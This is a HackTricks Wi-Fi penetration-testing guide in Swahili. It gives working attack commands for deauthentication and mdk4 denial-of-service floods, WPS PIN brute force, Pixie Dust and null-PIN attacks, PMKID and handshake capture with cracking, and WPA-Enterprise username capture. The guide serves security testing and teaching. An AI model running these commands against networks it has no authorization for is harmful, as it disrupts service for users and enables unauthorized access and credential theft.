# Pentesting Wifi

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa tuzo za mdudu!

**Machapisho Kuhusu Kudukua**\
Shiriki na yaliyomo yanayochunguza msisimko na changamoto za kudukua

**Habari za Kudukua za Wakati Halisi**\
Endelea kuwa na habari za ulimwengu wa kudukua kwa kasi kupitia habari na ufahamu wa wakati halisi

**Matangazo ya Hivi Karibuni**\
Baki na habari kuhusu tuzo mpya za mdudu zinazozinduliwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo!

## Amri za Msingi za Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
## Vifaa

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon ni chombo cha nguvu cha kufanya upimaji wa usalama wa mitandao ya Wi-Fi. Inatoa njia mbalimbali za kuvunja usalama wa mitandao ya Wi-Fi na kuchunguza udhaifu wake. Chombo hiki kinaweza kutumiwa kwa uchunguzi wa kina wa mitandao ya Wi-Fi ili kubaini mapungufu yake na kuchukua hatua za kurekebisha.

Airgeddon inaunganisha zana mbalimbali za kuvunja usalama wa Wi-Fi kama vile Aircrack-ng, Wifite, Reaver, Bully, na zingine nyingi. Inatoa njia rahisi na yenye nguvu ya kufanya mashambulizi ya kuvunja nywila za mitandao ya Wi-Fi, kuchunguza mitandao iliyofichwa, na kufanya uchunguzi wa kina wa mitandao ya Wi-Fi.

Chombo hiki kina interface ya mtumiaji iliyosanifu vizuri na inaruhusu watumiaji kufanya mashambulizi ya kuvunja usalama wa Wi-Fi kwa urahisi. Inatoa maelezo ya kina juu ya mitandao ya Wi-Fi inayopatikana, ikiwa ni pamoja na majina ya mitandao, nguvu ya ishara, na aina ya usalama inayotumiwa.

Airgeddon pia inatoa zana za kufanya uchunguzi wa kina wa mitandao ya Wi-Fi, kama vile kuchunguza vifaa vilivyounganishwa kwenye mtandao, kuchunguza udhaifu wa usalama, na kufanya uchambuzi wa trafiki ya mtandao.

Kwa ujumla, Airgeddon ni chombo cha nguvu cha kufanya upimaji wa usalama wa mitandao ya Wi-Fi. Inatoa njia mbalimbali za kuvunja usalama wa mitandao ya Wi-Fi na kuchunguza udhaifu wake. Chombo hiki ni muhimu kwa wataalamu wa usalama wa mitandao na wapenzi wa teknolojia ambao wanataka kuboresha usalama wa mitandao ya Wi-Fi.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Tumia airgeddon na docker**

Ili kutumia airgeddon na docker, unahitaji kufuata hatua zifuatazo:

1. Hakikisha kuwa docker imefungwa kwenye mfumo wako. Unaweza kufunga docker kwa kufuata maagizo kwenye tovuti rasmi ya docker.

2. Pakua saraka ya airgeddon kutoka kwenye hifadhi ya git ya airgeddon kwa kubonyeza kiunga hiki: [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon).

3. Fungua terminal na nenda kwenye saraka ya airgeddon uliyopakua.

4. Unda picha ya docker kwa kutumia amri ifuatayo:
   ```
   docker build -t airgeddon .
   ```

5. Baada ya mchakato wa ujenzi kukamilika, unaweza kuanza kontena la docker kwa kutumia amri ifuatayo:
   ```
   docker run -it --net=host --privileged airgeddon
   ```

6. Airgeddon itaanza kwenye kontena la docker na unaweza kuitumia kama kawaida.

Kwa kufuata hatua hizi, utaweza kutumia airgeddon na docker kwa urahisi na usalama.
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Kutoka: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Inaweza kutekeleza mashambulizi ya Evil Twin, KARMA, na Known Beacons na kisha kutumia kigezo cha ulaghai kuweza kupata nenosiri halisi la mtandao au kuiba siri za mitandao ya kijamii.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Hii zana inafanya mashambulizi ya **WPS/WEP/WPA-PSK** kiotomatiki. Itafanya yafuatayo kiotomatiki:

* Kuweka kiolesura katika hali ya ufuatiliaji
* Kuchunguza mitandao inayowezekana - Na kukuruhusu kuchagua wahanga
* Ikiwa ni WEP - Kuzindua mashambulizi ya WEP
* Ikiwa ni WPA-PSK
* Ikiwa ni WPS: Mashambulizi ya vumbi la Pixie na mashambulizi ya kubadilisha nguvu (kuwa makini, mashambulizi ya kubadilisha nguvu yanaweza kuchukua muda mrefu). Tambua kwamba haitajaribu PIN tupu au PIN zilizotengenezwa/kutoka kwenye database.
* Jaribu kukamata PMKID kutoka kwa AP ili kuivunja
* Jaribu kumtoa kwenye mtandao wateja wa AP ili kukamata handshake
* Ikiwa ni PMKID au Handshake, jaribu kubadilisha nguvu kwa kutumia nywila za juu 5000.

## Muhtasari wa Mashambulizi

* **DoS**
* Pakiti za kufuta/kuondoa -- Kukatisha watu wote (au ESSID/Client maalum)
* AP bandia zisizo na mpangilio -- Ficha mitandao, inaweza kusababisha kushindwa kwa skana
* Kuzidi mzigo wa AP -- Jaribu kumaliza AP (kawaida sio na faida sana)
* WIDS -- Cheza na IDS
* TKIP, EAPOL -- Baadhi ya mashambulizi maalum ya DoS kwa baadhi ya APs
* **Kuvunja**
* Kuvunja **WEP** (zana na njia mbalimbali)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** kuvunja kwa nguvu
* \[DoS +] Kukamata **WPA handshake** + Kuvunja
* **WPA-MGT**
* Kukamata **jina la mtumiaji**
* **Kuvunja kwa nguvu** Vitambulisho
* **Evil Twin** (na au bila DoS)
* **Open** Evil Twin \[+ DoS] -- Inafaa kukamata vitambulisho vya lango la mtumwa na/au kufanya mashambulizi ya LAN
* **WPA-PSK** Evil Twin -- Inafaa kwa mashambulizi ya mtandao ikiwa unajua nenosiri
* **WPA-MGT** -- Inafaa kukamata vitambulisho vya kampuni
* **KARMA, MANA**, **Loud MANA**, **Beacon inayojulikana**
* **+ Open** -- Inafaa kukamata vitambulisho vya lango la mtumwa na/au kufanya mashambulizi ya LAN
* **+ WPA** -- Inafaa kukamata WPA handshakes

## DOS

### Pakiti za Kufuta

**Maelezo kutoka** [**hapa**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Mashambulizi ya **kufuta**, njia inayotumiwa sana katika udukuzi wa Wi-Fi, yanahusisha kufanya "frames" za "usimamizi" kwa lengo la **kuwafuta kwa nguvu vifaa kutoka kwenye mtandao**. Pakiti hizi zisizo na usimbaji zinawadanganya wateja kuamini kuwa zinatoka kwenye mtandao halali, kuruhusu wadukuzi kukusanya vitambulisho vya WPA kwa madhumuni ya kuvunja au kuvuruga kwa kudumu uhusiano wa mtandao. Mkakati huu, ambao ni rahisi sana, unatumika sana na una athari kubwa kwa usalama wa mtandao.

**Kufuta kwa kutumia Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 inamaanisha kufuta uthibitisho
* 1 ni idadi ya uthibitisho wa kutuma (unaweza kutuma zaidi ikiwa unataka); 0 inamaanisha kutuma kwa muda usioisha
* \-a 00:14:6C:7E:40:80 ni anwani ya MAC ya kufikia kwa upatikanaji
* \-c 00:0F:B5:34:30:30 ni anwani ya MAC ya mteja wa kufuta uthibitisho; ikiwa hii haipo basi kufuta uthibitisho kwa utangazaji hutumwa (haifanyi kazi kila wakati)
* ath0 ni jina la kiolesura

### Pakiti za Kukatisha Uhusiano

**Pakiti za kukatisha uhusiano**, kama vile pakiti za kufuta uthibitisho, ni aina ya fremu ya usimamizi inayotumiwa katika mitandao ya Wi-Fi. Pakiti hizi hutumika kuvunja uhusiano kati ya kifaa (kama vile kompyuta ndogo au simu ya mkononi) na kifaa cha kupatia (AP). Tofauti kuu kati ya kukatisha uhusiano na kufuta uthibitisho iko katika matumizi yao. Wakati AP inatuma **pakiti za kufuta uthibitisho kuondoa vifaa vya udanganyifu moja kwa moja kutoka kwenye mtandao, pakiti za kukatisha uhusiano kawaida hutumwa wakati AP inafanyiwa kuzimwa**, kuanzishwa upya, au kuhamishwa, hivyo kuhitaji kuvunja uhusiano wa vifaa vyote vilivyounganishwa.

**Shambulio hili linaweza kutekelezwa na mdk4 (mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mbinu zaidi za mashambulizi ya DOS kwa kutumia mdk4**

**Katika** [**hapa**](https://en.kali.tools/?p=864)**.**

**MODE YA MSHAMBULIZI b: Kuzidiwa kwa Beacon**

Inatuma fremu za beacon kuonyesha AP bandia kwa wateja. Mara nyingine inaweza kusababisha kushindwa kwa skana za mtandao na hata madereva!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODE YA SHAMBULIZI a: Kukataa Huduma ya Uthibitishaji**

Kutuma fremu za uthibitishaji kwa vituo vyote vya kupatikana vya Kufikia (APs) ndani ya umbali unaweza kusababisha mzigo mkubwa kwa APs hizi, hasa wakati wateja wengi wanahusika. Trafiki hii kali inaweza kusababisha kutokuwa na utulivu kwa mfumo, kusababisha baadhi ya APs kufungia au hata kurejesha upya.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**NJIA YA SHAMBULIZI p: Kuchunguza na Kuvunja Nenosiri la SSID**

Kuchunguza Vituo vya Kupata (APs) huchunguza kama SSID inafichuliwa vizuri na kuthibitisha umbali wa AP. Mbinu hii, pamoja na **kuvunja nguvu SSID zilizofichwa** na au bila orodha ya maneno, husaidia kutambua na kupata mitandao iliyofichwa.

**NJIA YA SHAMBULIZI m: Kutumia Mbinu za Kuzuia Michael**

Kutuma pakiti zisizo na mpangilio au pakiti zinazofanana kwenye foleni tofauti za QoS kunaweza kusababisha Mbinu za Kuzuia Michael kwenye AP za **TKIP**, ikisababisha kuzimwa kwa AP kwa dakika moja. Mbinu hii ni njia yenye ufanisi ya shambulizi la **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**NJIA YA SHAMBULIZI e: Kuingiza Pakiti za EAPOL Start na Logoff**

Kuwagharimu AP na **mifumo bandia ya EAPOL Start** husababisha kuzidiwa na AP na kuzuia wateja halali. Kwa upande mwingine, kuingiza **ujumbe bandia wa EAPOL Logoff** kwa nguvu huwafunga wateja, njia zote mbili zinavuruga huduma ya mtandao kwa ufanisi.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**NJIA YA MSHAMBULIZI s: Mshambulizi kwa mitandao ya kushikamana ya IEEE 802.11s**

Mashambulizi mbalimbali kwenye usimamizi wa kiungo na uundaji wa njia kwenye mitandao ya kushikamana.

**NJIA YA MSHAMBULIZI w: Utatanishi wa WIDS**

Kuunganisha wateja kwenye nodi nyingi za WDS au AP bandia za kudanganya kunaweza kubadilisha Mifumo ya Uchunguzi na Kuzuia Uvamizi, kusababisha utatanishi na matumizi mabaya ya mfumo.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**NJIA YA SHAMBULIO f: Packet Fuzzer**

Packet fuzzer inayojumuisha vyanzo vingi vya pakiti na seti kamili ya mabadiliko ya pakiti.

### **Airggedon**

_**Airgeddon**_ inatoa mashambulizi mengi yaliyopendekezwa katika maoni ya awali:

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS (Wi-Fi Protected Setup) inafanya iwe rahisi kuunganisha vifaa kwenye router, ikiboresha kasi ya usanidi na urahisi kwa mitandao iliyofichwa na **WPA** au **WPA2** Personal. Haifai kwa usalama wa WEP ambao ni rahisi kudukuliwa. WPS inatumia PIN ya nambari 8, ambayo inathibitishwa katika sehemu mbili, na hivyo kuifanya iwe rahisi kushambuliwa kwa nguvu kwa sababu ya idadi ndogo ya mchanganyiko (11,000 uwezekano).

### WPS Bruteforce

Kuna zana 2 kuu za kutekeleza hatua hii: Reaver na Bully.

* **Reaver** imeundwa kuwa shambulio imara na la vitendo dhidi ya WPS, na imejaribiwa dhidi ya aina mbalimbali za vituo vya kupata na utekelezaji wa WPS.
* **Bully** ni **utekelezaji mpya** wa shambulio la nguvu la WPS, iliyoandikwa kwa C. Ina faida kadhaa juu ya msimbo wa awali wa reaver: inahitaji tegemezi chache, inaboresha utendaji wa kumbukumbu na cpu, inashughulikia kwa usahihi endianness, na ina seti yenye nguvu zaidi ya chaguo.

Shambulio linatumia udhaifu wa **PIN ya WPS**, hasa kufichua tarakimu nne za kwanza na jukumu la tarakimu ya mwisho kama kisanduku cha ukaguzi, hivyo kuifanya iwe rahisi kushambuliwa kwa nguvu. Hata hivyo, ulinzi dhidi ya mashambulizi ya nguvu, kama **kuzuia anwani za MAC** za wadukuzi wenye msukumo, inahitaji **mzunguko wa anwani za MAC** ili kuendeleza shambulio.

Baada ya kupata PIN ya WPS kwa zana kama Bully au Reaver, mshambuliaji anaweza kudhani WPA/WPA2 PSK, kuhakikisha **upatikanaji wa mtandao endelevu**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Udanganyifu wa Nguvu wa Kijanja**

Njia hii iliyoboreshwa inalenga PIN za WPS kwa kutumia udhaifu uliojulikana:

1. **PIN zilizogunduliwa mapema**: Tumia kanzidata ya PIN zilizojulikana zinazohusishwa na watengenezaji maalum wanaojulikana kutumia PIN za WPS zilizofanana. Kanzidata hii inalinganisha sehemu tatu za kwanza za anwani ya MAC na PIN zinazowezekana kwa watengenezaji hawa.
2. **Algoritimu za Uzalishaji wa PIN**: Tumia algoritimu kama ComputePIN na EasyBox, ambazo huzalisha PIN za WPS kulingana na anwani ya MAC ya AP. Algoritimu ya Arcadyan inahitaji pia kitambulisho cha kifaa, ikiongeza safu kwenye mchakato wa uzalishaji wa PIN.

### Shambulio la WPS Pixie Dust

**Dominique Bongard** aligundua kasoro katika baadhi ya Pointi za Kufikia (APs) kuhusu uundaji wa nambari za siri, zinazojulikana kama **nonces** (**E-S1** na **E-S2**). Ikiwa nonces hizi zinaweza kugunduliwa, kuvunja PIN ya WPS ya AP inakuwa rahisi. AP inafichua PIN ndani ya nambari maalum (hash) ili kuthibitisha kuwa ni halali na sio AP bandia (rogue). Nonces hizi ni "funguo" za kufungua "sefu" inayoshikilia PIN ya WPS. Unaweza kupata maelezo zaidi kuhusu hili [hapa](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

Kwa maneno rahisi, tatizo ni kwamba baadhi ya APs hazikutumia funguo za kutosha za kubahatisha kwa kusimbua PIN wakati wa mchakato wa kuunganisha. Hii inafanya PIN kuwa hatarini kwa kudhaniwa kutoka nje ya mtandao (shambulio la nguvu la nje ya mtandao).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Shambulio la Null Pin

Baadhi ya mifumo iliyojengwa vibaya hata huruhusu **Null PIN** (PIN tupu au usiopo) kutoa ufikiaji, jambo ambalo ni la kawaida sana. Zana ya **Reaver** inaweza kufanya majaribio ya kugundua udhaifu huu, tofauti na **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Mbinu zote za mashambulizi za WPS zinaweza kutekelezwa kwa urahisi kwa kutumia _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* 5 na 6 inakuwezesha kujaribu **PIN yako ya desturi** (ikiwa una yoyote)
* 7 na 8 hutekeleza shambulio la **Pixie Dust**
* 13 inakuwezesha kujaribu **PIN ya NULL**
* 11 na 12 zitakusanya tena PIN zinazohusiana na AP iliyochaguliwa kutoka kwenye database zilizopo na kuzalisha PINs zinazowezekana kwa kutumia: ComputePIN, EasyBox na hiari Arcadyan (inapendekezwa, kwa nini la sivyo?)
* 9 na 10 zitajaribu **kila PIN inayowezekana**

## **WEP**

Imeharibika na haikutumiwa siku hizi. Jua tu kwamba _**airgeddon**_ ina chaguo la WEP linaloitwa "All-in-One" kushambulia aina hii ya ulinzi. Zana zingine zinatoa chaguo sawa.

![](<../../.gitbook/assets/image (125).png>)


***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Jiunge na seva ya [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa tuzo za mdudu!

**Machapisho ya Udukuzi**\
Shiriki na yaliyomo yanayochunguza msisimko na changamoto za udukuzi

**Habari za Udukuzi za Wakati Halisi**\
Endelea kuwa na habari za ulimwengu wa udukuzi wenye kasi kupitia habari na ufahamu wa wakati halisi

**Matangazo ya Hivi Karibuni**\
Baki na habari za hivi karibuni kuhusu tuzo mpya za mdudu zinazoanzishwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo!

***


## WPA/WPA2 PSK

### PMKID

Mwaka 2018, **hashcat** [ilifichua](https://hashcat.net/forum/thread-7717.html) njia mpya ya shambulio, ambayo ni ya kipekee kwa sababu inahitaji **pakiti moja tu** na haitaji wateja wowote kuwa wameunganishwa kwenye AP ya lengo - tu mwingiliano kati ya mshambuliaji na AP.

Routa nyingi za kisasa zinaongeza **uwanja wa hiari** kwenye fremu ya **EAPOL ya kwanza** wakati wa ushirikiano, inayojulikana kama `Robust Security Network`. Hii inajumuisha `PMKID`.

Kama chapisho la awali linavyoelezea, **PMKID** inaundwa kwa kutumia data inayojulikana:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Kwa kuwa "Jina la PMK" ni thabiti, tunajua BSSID ya AP na kituo, na `PMK` ni sawa na ile kutoka kwa mshono wa 4 njia kamili, **hashcat** inaweza kutumia habari hii kuvunja PSK na kupata nywila!

Kukusanya habari hii na kuvunja nguvu nywila kwa njia ya ndani, unaweza kufanya:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs zilizochukuliwa** zitaonyeshwa kwenye **console** na pia **kuhifadhiwa** ndani ya \_ **/tmp/attack.pcap**\_\
Sasa, badilisha kuchukua kwa muundo wa **hashcat/john** na uvunje:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Tafadhali kumbuka kuwa muundo sahihi wa hash una sehemu **4**, kama vile: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838`
Ikiwa yako ina sehemu **3** tu, basi, ni **batili** (kukamata PMKID haikuwa sahihi).

Tafadhali kumbuka kuwa `hcxdumptool` **pia inakamata handshakes** (kitu kama hiki kitatokea: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Unaweza **kubadilisha** handshakes kuwa muundo wa **hashcat**/**john** kwa kutumia `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Nimegundua kuwa baadhi ya handshakes zilizokamatwa na chombo hiki hazikuweza kuvunjwa hata kwa kujua nenosiri sahihi. Ningependekeza kukamata handshakes pia kwa njia ya jadi ikiwezekana, au kukamata kadhaa kwa kutumia chombo hiki._

### Utekelezaji wa Handshake

Shambulio kwenye mitandao ya **WPA/WPA2** linaweza kutekelezwa kwa kukamata **handshake** na kujaribu **kuvunja** nenosiri **nje ya mtandao**. Mchakato huu unahusisha kufuatilia mawasiliano ya mtandao maalum na **BSSID** kwenye **channel** fulani. Hapa kuna mwongozo rahisi:

1. Tambua **BSSID**, **channel**, na **mteja aliyeunganishwa** kwenye mtandao wa lengo.
2. Tumia `airodump-ng` kufuatilia trafiki ya mtandao kwenye channel na BSSID iliyotajwa, ukitumaini kukamata handshake. Amri itaonekana kama ifuatavyo:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Ili kuongeza nafasi ya kukamata handshake, katiza muda mfupi uhusiano wa mteja kutoka kwenye mtandao ili kumfanya afanye uthibitisho upya. Hii inaweza kufanywa kwa kutumia amri ya `aireplay-ng`, ambayo inatuma pakiti za kufuta uthibitisho kwa mteja:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note kwamba kama mteja aliondolewa uthibitisho, anaweza kujaribu kuunganisha na AP tofauti au, katika hali nyingine, kwenye mtandao tofauti._

Maradhi katika `airodump-ng` inaonekana taarifa ya handshake hii inamaanisha kuwa handshake imekamatwa na unaweza kuacha kusikiliza:

![](<../../.gitbook/assets/image (172) (1).png>)

Baada ya handshake kukamatwa unaweza **kuvunja** kwa kutumia `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Angalia ikiwa kuna handshake katika faili

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark** ni chombo cha kisasa cha kuchambua trafiki ya mtandao. Inaruhusu watumiaji kusikiliza na kurekodi pakiti za mtandao zinazopita kupitia kadi ya mtandao. Tshark inatoa uwezo wa kuchanganua na kuchuja pakiti za mtandao kulingana na vigezo mbalimbali kama vile anwani za IP, itifaki, na bandari. Chombo hiki ni muhimu sana katika uchunguzi wa usalama wa mtandao na uchambuzi wa trafiki.
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Kama kifaa hiki kinapata handshake isiyokamilika ya ESSID kabla ya ile iliyokamilika, hakitagundua ile halali._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Katika **mazingira ya WiFi ya biashara, utakutana na njia mbalimbali za uwakishaji**, kila moja ikitoa viwango tofauti vya usalama na huduma za usimamizi. Unapotumia zana kama `airodump-ng` kuangalia trafiki ya mtandao, unaweza kugundua vitambulisho kwa njia hizi za uwakishaji. Baadhi ya njia za kawaida ni pamoja na:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Kadi ya Alama ya Kawaida)**:
- Njia hii inasaidia vifaa vya kadi za vifaa na nywila za wakati mmoja ndani ya EAP-PEAP. Tofauti na MSCHAPv2, haifanyi changamoto ya rika na hutoa nywila kwa maandishi wazi kwa kifaa cha kupata, ambayo inaleta hatari ya mashambulizi ya kushusha kiwango.

2. **EAP-MD5 (Ujumbe wa Kuchimba 5)**:
- Inahusisha kutuma hash ya MD5 ya nywila kutoka kwa mteja. **Haitoshi** kutokana na hatari ya mashambulizi ya kamusi, ukosefu wa uthibitisho wa seva, na kutokuweza kuzalisha funguo za WEP za kikao maalum.

3. **EAP-TLS (Usalama wa Tabaka la Usafirishaji)**:
- Inatumia vyeti vya pande zote za mteja na seva kwa uthibitisho na inaweza kuzalisha funguo za WEP za msingi wa mtumiaji na kikao kwa ajili ya kusimamia mawasiliano.

4. **EAP-TTLS (Usalama wa Tabaka la Usafirishaji wa Tunneled)**:
- Hutoa uthibitisho wa pande zote kupitia handaki iliyofichwa, pamoja na njia ya kuzalisha funguo za WEP za kikao maalum kwa kila mtumiaji. Inahitaji vyeti tu vya seva, na wateja hutumia vitambulisho.

5. **PEAP (Itifaki ya Uthibitishaji Iliyozuiwa)**:
- Inafanya kazi kwa njia sawa na EAP kwa kujenga handaki ya TLS kwa mawasiliano salama. Inaruhusu matumizi ya njia dhaifu za uthibitisho juu ya EAP kutokana na ulinzi unaotolewa na handaki.
* **PEAP-MSCHAPv2**: Mara nyingi huitwa PEAP, inachanganya mfumo wa changamoto / majibu wa MSCHAPv2 wenye udhaifu na handaki ya TLS ya kinga.
* **PEAP-EAP-TLS (au PEAP-TLS)**: Kama EAP-TLS lakini inaanzisha handaki ya TLS kabla ya kubadilishana vyeti, ikitoa safu ya ziada ya usalama.

Unaweza kupata habari zaidi kuhusu njia hizi za uthibitisho [hapa](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) na [hapa](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Kukamata Jina la Mtumiaji

Kusoma [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) inaonekana kama unatumia **EAP** **"Ujumbe wa Kitambulisho"** lazima uweze **kusaidia**, na **jina la mtumiaji** litatumwa wazi katika **"Jibu Kitambulisho"** ujumbe.

Hata kwa kutumia moja ya njia salama zaidi za uthibitisho: **PEAP-EAP-TLS**, ni rahisi kuchukua **jina la mtumiaji lililotumwa katika itifaki ya EAP**. Ili kufanya hivyo, **chukua mawasiliano ya uthibitisho** (anza `airodump-ng` ndani ya kituo na `wireshark` kwenye kiolesura kile kile) na chuja pakiti kwa `eapol`.\
Ndani ya pakiti ya "**Jibu, Kitambulisho**", jina la **mtumiaji** wa mteja litatokea.

![](<../../.gitbook/assets/image (150).png>)

### Kitambulisho cha Anonimasi

Kujificha kitambulisho kunasaidiwa na EAP-PEAP na EAP-TTLS. Katika muktadha wa mtandao wa WiFi, ombi la kitambulisho la EAP kawaida huanzishwa na kifaa cha kupata (AP) wakati wa mchakato wa ushirikiano. Ili kuhakikisha ulinzi wa kutotambulika kwa mtumiaji, jibu kutoka kwa mteja wa EAP kwenye kifaa cha mtumiaji kinachukua tu habari muhimu inayohitajika kwa seva ya RADIUS ya awali kusindika ombi. Dhana hii inaonyeshwa kupitia mifano ifuatayo:

* EAP-Kitambulisho = anonimasi

